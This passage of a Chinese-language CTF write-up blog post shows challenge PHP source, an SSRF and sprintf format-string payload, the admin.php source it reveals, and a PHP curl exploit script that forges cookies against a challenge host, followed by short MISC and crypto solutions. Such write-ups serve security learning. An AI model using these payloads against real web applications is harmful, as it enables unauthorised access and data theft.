class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;system.php</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if (!isset($_COOKIE[&#39;y1ng&#39;]) || $_COOKIE[&#39;y1ng&#39;] !&#x3D;&#x3D; sha1(md5(&#39;y1ng&#39;)))&#123;</span><br><span class="line">    echo &quot;&lt;script&gt;alert(&#39;why you are here!&#39;);alert(&#39;fxck your scanner&#39;);alert(&#39;fxck you! get out!&#39;);&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">    header(&quot;Refresh:0.1;url&#x3D;index.php&quot;);</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str2 &#x3D; &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;url invalid&lt;br&gt;~$ &#39;;</span><br><span class="line">$str3 &#x3D; &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;damn hacker!&lt;br&gt;~$ &#39;;</span><br><span class="line">$str4 &#x3D; &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;request method error&lt;br&gt;~$ &#39;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD XHTML 1.0 Transitional&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;xhtml1&#x2F;DTD&#x2F;xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt;</span><br><span class="line">    &lt;title&gt;File Detector&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;normalize.css&quot; &#x2F;&gt;</span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;demo.css&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;component.css&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script src&#x3D;&quot;js&#x2F;modernizr.custom.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;section&gt;</span><br><span class="line">    &lt;form id&#x3D;&quot;theForm&quot; class&#x3D;&quot;simform&quot; autocomplete&#x3D;&quot;off&quot; action&#x3D;&quot;system.php&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;simform-inner&quot;&gt;</span><br><span class="line">            &lt;span&gt;&lt;p&gt;&lt;center&gt;File Detector&lt;&#x2F;center&gt;&lt;&#x2F;p&gt;&lt;&#x2F;span&gt;</span><br><span class="line">            &lt;ol class&#x3D;&quot;questions&quot;&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;span&gt;&lt;label for&#x3D;&quot;q1&quot;&gt;你知道目录下都有什么文件吗?&lt;&#x2F;label&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                    &lt;input id&#x3D;&quot;q1&quot; name&#x3D;&quot;q1&quot; type&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">                &lt;&#x2F;li&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;span&gt;&lt;label for&#x3D;&quot;q2&quot;&gt;请输入你想检测文件内容长度的url&lt;&#x2F;label&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                    &lt;input id&#x3D;&quot;q2&quot; name&#x3D;&quot;q2&quot; type&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">                &lt;&#x2F;li&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;span&gt;&lt;label for&#x3D;&quot;q1&quot;&gt;你希望以何种方式访问？GET？POST?&lt;&#x2F;label&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                    &lt;input id&#x3D;&quot;q3&quot; name&#x3D;&quot;q3&quot; type&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">                &lt;&#x2F;li&gt;</span><br><span class="line">            &lt;&#x2F;ol&gt;</span><br><span class="line">            &lt;button class&#x3D;&quot;submit&quot; type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot;&gt;提交&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;div class&#x3D;&quot;controls&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&quot;next&quot;&gt;&lt;&#x2F;button&gt;</span><br><span class="line">                &lt;div class&#x3D;&quot;progress&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">                &lt;span class&#x3D;&quot;number&quot;&gt;</span><br><span class="line">					&lt;span class&#x3D;&quot;number-current&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">					&lt;span class&#x3D;&quot;number-total&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">				&lt;&#x2F;span&gt;</span><br><span class="line">                &lt;span class&#x3D;&quot;error-message&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;span class&#x3D;&quot;final-message&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">    &lt;span&gt;&lt;p&gt;&lt;center&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;gem-love.com&quot; target&#x3D;&quot;_blank&quot;&gt;@颖奇L&#39;Amore&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&lt;&#x2F;p&gt;&lt;&#x2F;span&gt;</span><br><span class="line">&lt;&#x2F;section&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;js&#x2F;classie.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;js&#x2F;stepsForm.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">    var theForm &#x3D; document.getElementById( &#39;theForm&#39; );</span><br><span class="line"></span><br><span class="line">    new stepsForm( theForm, &#123;</span><br><span class="line">        onSubmit : function( form ) &#123;</span><br><span class="line">            classie.addClass( theForm.querySelector( &#39;.simform-inner&#39; ), &#39;hide&#39; );</span><br><span class="line">            var messageEl &#x3D; theForm.querySelector( &#39;.final-message&#39; );</span><br><span class="line">            form.submit();</span><br><span class="line">            messageEl.innerHTML &#x3D; &#39;Ok...Let me have a check&#39;;</span><br><span class="line">            classie.addClass( messageEl, &#39;show&#39; );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; );</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$filter1 &#x3D; &#39;&#x2F;^http:\&#x2F;\&#x2F;127\.0\.0\.1\&#x2F;&#x2F;i&#39;;</span><br><span class="line">$filter2 &#x3D; &#39;&#x2F;.?f.?l.?a.?g.?&#x2F;i&#39;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#39;q1&#39;]) &amp;&amp; isset($_POST[&#39;q2&#39;]) &amp;&amp; isset($_POST[&#39;q3&#39;]) ) &#123;</span><br><span class="line">    $url &#x3D; $_POST[&#39;q2&#39;].&quot;.y1ng.txt&quot;;</span><br><span class="line">    $method &#x3D; $_POST[&#39;q3&#39;];</span><br><span class="line"></span><br><span class="line">    $str1 &#x3D; &quot;~$ python fuck.py -u \&quot;&quot;.$url .&quot;\&quot; -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint&#x3D;xiangdemei&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    echo $str1;</span><br><span class="line"></span><br><span class="line">    if (!preg_match($filter1, $url) )&#123;</span><br><span class="line">        die($str2);</span><br><span class="line">    &#125;</span><br><span class="line">    if (preg_match($filter2, $url)) &#123;</span><br><span class="line">        die($str3);</span><br><span class="line">    &#125;</span><br><span class="line">    if (!preg_match(&#39;&#x2F;^GET&#x2F;i&#39;, $method) &amp;&amp; !preg_match(&#39;&#x2F;^POST&#x2F;i&#39;, $method)) &#123;</span><br><span class="line">        die($str4);</span><br><span class="line">    &#125;</span><br><span class="line">    $detect &#x3D; @file_get_contents($url, false);</span><br><span class="line">    print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>利用sprintf格式化字符漏洞</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">q1&#x3D;y&amp;q2&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;admin.php?&amp;q3&#x3D;GET%25s%25</span><br><span class="line">&#x2F;&#x2F;admin.php?中的?是为了把拼接的.y1ng.txt当成参数废掉</span><br><span class="line">&#x2F;&#x2F;%25是%的url编码,第一个%s是为了格式化得到detect的值,第二个%是为转移掉%d使其变成%%d,格式化输出结果就是%d</span><br></pre></td></tr></table></figure>
+<p>得到admin.php的源码,</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">$f1ag &#x3D; &#39;f1ag&#123;s1mpl3_SSRF_@nd_spr1ntf&#125;&#39;; &#x2F;&#x2F;fake</span><br><span class="line"></span><br><span class="line">function aesEn($data, $key)</span><br><span class="line">&#123;</span><br><span class="line">    $method &#x3D; &#39;AES-128-CBC&#39;;</span><br><span class="line">    $iv &#x3D; md5($_SERVER[&#39;REMOTE_ADDR&#39;],true);</span><br><span class="line">    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Check()</span><br><span class="line">&#123;</span><br><span class="line">    if (isset($_COOKIE[&#39;your_ip_address&#39;]) &amp;&amp; $_COOKIE[&#39;your_ip_address&#39;] &#x3D;&#x3D;&#x3D; md5($_SERVER[&#39;REMOTE_ADDR&#39;]) &amp;&amp; $_COOKIE[&#39;y1ng&#39;] &#x3D;&#x3D;&#x3D; sha1(md5(&#39;y1ng&#39;)))</span><br><span class="line">        return true;</span><br><span class="line">    else</span><br><span class="line">        return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D;&#x3D; &quot;127.0.0.1&quot; ) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body bgcolor&#x3D;black&gt;&lt;center&gt;&lt;font size&#x3D;&#39;10px&#39; color&#x3D;white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is &quot; . $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$_SESSION[&#39;user&#39;] &#x3D; md5($_SERVER[&#39;REMOTE_ADDR&#39;]);</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;decrypt&#39;])) &#123;</span><br><span class="line">    $decr &#x3D; $_GET[&#39;decrypt&#39;];</span><br><span class="line">    if (Check())&#123;</span><br><span class="line">        $data &#x3D; $_SESSION[&#39;secret&#39;];</span><br><span class="line">        include &#39;flag_2sln2ndln2klnlksnf.php&#39;;</span><br><span class="line">        $cipher &#x3D; aesEn($data, &#39;y1ng&#39;);</span><br><span class="line">        if ($decr &#x3D;&#x3D;&#x3D; $cipher)&#123;</span><br><span class="line">            echo WHAT_YOU_WANT;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            die(&#39;爬&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else&#123;</span><br><span class="line">        header(&quot;Refresh:0.1;url&#x3D;index.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    &#x2F;&#x2F;I heard you can break PHP mt_rand seed</span><br><span class="line">    mt_srand(rand(0,9999999));</span><br><span class="line">    $length &#x3D; mt_rand(40,80);</span><br><span class="line">    $_SESSION[&#39;secret&#39;] &#x3D; bin2hex(random_bytes($length));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>exp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function aesEn ($key) &#123;</span><br><span class="line">	$method &#x3D; &#39;AES-128-CBC&#39;;</span><br><span class="line">	$iv &#x3D; md5(&#39;174.0.222.75&#39;, true);</span><br><span class="line">	return base64_encode(openssl_encrypt($data, $method, $key, OPENSSL_RAW_DATA, $iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url &#x3D; &quot;http:&#x2F;&#x2F;65a5817a-c324-407c-af18-b7c448bc09b4.node3.buuoj.cn&#x2F;admin.php?decrypt&#x3D;&quot;;</span><br><span class="line">$cookes &#x3D; &quot;y1ng&#x3D;8880cbd71721332a25aa6df7b12eb7ac53539100; your_ip_address&#x3D;76d9f00467e5ee6abc3ca60892ef304e&quot;;</span><br><span class="line">$curl &#x3D; curl_init();</span><br><span class="line">curl_setopt($curl, CURLOPT_URL, $url);</span><br><span class="line">curl_setopt($curl, CURLOPT_COOKIE, $cookes);</span><br><span class="line">$cipher &#x3D; aesEn(&#39;y1ng&#39;);</span><br><span class="line">$url &#x3D; $url . urlencode($cipher);</span><br><span class="line">curl_setopt($curl, CURLOPT_URL, $url);</span><br><span class="line">$result &#x3D; curl_exec($curl);</span><br><span class="line">var_dump($result);</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;加密方式知道,所以访问一下admin.php得到你访问的ip</span><br><span class="line">&#x2F;&#x2F;不穿PHPsessionid,session就为空,所以加密的data等于null,只要加密key就行</span><br></pre></td></tr></table></figure>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="最简单MISC"><a href="#最简单MISC" class="headerlink" title="最简单MISC"></a>最简单MISC</h3><p>7z打开,解压得到文件sercet</p>
+<p>winhex查看,缺少PNG的文件头,补上文件头再修改后缀为png打开得到flag</p>
+<h3 id="A-Beautiful-Picture"><a href="#A-Beautiful-Picture" class="headerlink" title="A_Beautiful_Picture"></a>A_Beautiful_Picture</h3><p>winhex打开,图片高改高得到flag</p>
+<h3 id="EasyBaBa"><a href="#EasyBaBa" class="headerlink" title="EasyBaBa"></a>EasyBaBa</h3><p>binwalk分析图片</p>
+<p>分理出压缩包,压缩包内是视频,打开视频,中间有一串很快的图片</p>
+<p>用windows自带的照片视频打开,点编辑,一帧帧的看,有二维码的页面扫码得到下面文字</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">424A447B79316E677A756973687561697D</span><br></pre></td></tr></table></figure>
+<p>hex转ASCII,调整一下顺序组成一句话,得到flag</p>
+<h3 id="小姐姐"><a href="#小姐姐" class="headerlink" title="小姐姐"></a>小姐姐</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings xiaojiejie.jpeg|grep BJD</span><br></pre></td></tr></table></figure>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="签到-y1ng"><a href="#签到-y1ng" class="headerlink" title="签到-y1ng"></a>签到-y1ng</h3><p>base64解码得到flag</p>
+<h3 id="老文盲"><a href="#老文盲" class="headerlink" title="老文盲"></a>老文盲</h3><p>用百度翻译朗读</p>
+<p>BJD{这就是flag},中间是原汉字</p>
+<h3 id="燕言燕语"><a href="#燕言燕语" class="headerlink" title="燕言燕语"></a>燕言燕语</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20</span><br></pre></td></tr></table></figure>
+<p>hex转ASCII</p>
+<p>得到：<code>yanzi ZJQ&#123;xilzv_iqssuhoc_suzjg&#125;</code></p>
+<p>如果是rot13,偏移量应该相同,但是这里不同,所以是维吉尼亚密码</p>
+<p>yanzi 是 key，解密一下得到 flag</p>
+<h3 id="灵能精通"><a href="#灵能精通" class="headerlink" title="灵能精通"></a>灵能精通</h3><p>下载得到jpg,改后缀为jpg,打开发现是一些符号,搜索一下得知是圣堂武士密码,是猪圈密码的变形</p>
+<p>对应解密得到<br><code>IMKNIGHTSTEMPLAR</code><br>包上flag<br><code>flag&#123;IMKNIGHTSTEMPLAR&#125;</code></p>
+<h3 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat_flag"></a>cat_flag</h3><p>猫转二进制</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">01000010</span><br><span class="line">01001010</span><br><span class="line">01000100</span><br><span class="line">01111011</span><br><span class="line">01001101</span><br><span class="line">00100001</span><br><span class="line">01100001</span><br><span class="line">00110000</span><br><span class="line">01111110</span><br><span class="line">01111101</span><br><span class="line">BJD&#123;M!a0~&#125;</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button onclick="document.querySelector('.post-reward').classList.toggle('active');">
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="D15h35 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.jpg" alt="D15h35 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+              <a href="/tags/WP/" rel="tag"><i class="fa fa-tag"></i> WP</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/03/16/CTF/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" rel="prev" title="PHP伪协议">
+                  <i class="fa fa-chevron-left"></i> PHP伪协议
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/03/29/CTF_WP/ctfshow_%E5%86%85%E9%83%A8%E8%B5%9B/" rel="next" title="CTFshow内部赛_WP">
+                  CTFshow内部赛_WP <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">D15h35</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+  <script>
+    NProgress.configure({
+      showSpinner: true
+    });
+    NProgress.start();
+    document.addEventListener('readystatechange', () => {
+      if (document.readyState === 'interactive') {
+        NProgress.inc(0.8);
+      }
+      if (document.readyState === 'complete') {
+        NProgress.done();
+      }
+    });
+    document.addEventListener('pjax:send', () => {
+      NProgress.start();
+    });
+    document.addEventListener('pjax:success', () => {
+      NProgress.done();
+    });
+  </script>
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
